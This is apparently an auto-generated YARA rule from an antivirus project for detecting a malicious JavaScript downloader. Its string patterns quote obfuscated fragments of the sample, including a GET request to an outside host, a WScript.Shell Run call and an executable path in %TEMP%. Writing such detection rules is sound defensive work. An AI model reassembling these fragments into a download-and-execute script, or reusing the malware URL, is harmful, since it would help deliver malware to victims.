rule sig_20160328_f3ff63661de714fbc34599bd510c63ad {
  meta:
    description = "datamaliciousorder - file 20160328_f3ff63661de714fbc34599bd510c63ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "229fccba7046cd2e864dcfdb4dbcda33f1e35c0b7de61be71b10124063c92147"

  strings:
    $s1  = "function Arqccdnx() {return Ltbghn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7SitkY5xz.exe\";};" fullword ascii
    $s2  = "Pwcysb[Nkkzj](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Fgrskhay](Jglsf() * 11)} while (Pwcysb[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ltbghn = function Vfyvyed() {return WScript[Dfcbcqyajz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fjumcqtz(Egkfh, Khzvgfkf){return Egkfh - Khzvgfkf;};" fullword ascii
    $s6  = "function Izjebstnqv(Rfjfoz){Ltbghn[\"Run\"](Rfjfoz, Apuwgiavoz, Apuwgiavoz);};" fullword ascii
    $s7  = "function Kqbco() {return ((Njkgsrtrza == true) && (Njkgsrtrza == Sioqy)) ? 1 : Apuwgiavoz;};" fullword ascii
    $s8  = "var Njkgsrtrza = false;" fullword ascii
    $s9  = "var Sioqy = false;" fullword ascii
    $s10 = "var Ynhwnf = new this[\"Date\"]();" fullword ascii
    $s11 = "function Cteiwgvmj()" fullword ascii
    $s12 = "function Zjkqi(){return Dfcbcqyajz;};" fullword ascii
    $s13 = "function Jglsf(){return 22;};" fullword ascii
    $s14 = "Njkgsrtrza = true; " fullword ascii
    $s15 = "Sioqy = true; " fullword ascii
    $s16 = " while (Rmfqvwxhoy){" fullword ascii
    $s17 = "function Lxqigqz(Tlafpxio) {var Jtbjsynvg = (1, 2, 3, 4, 5, Tlafpxio); return Jtbjsynvg;};" fullword ascii
    $s18 = "var Pjiifpn = false;" fullword ascii
    $s19 = "function Eyvwkdi(){return Rcxtovi;};" fullword ascii
    $s20 = "return Fjumcqtz(Yjwmjyqeb, Exgeahmf);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}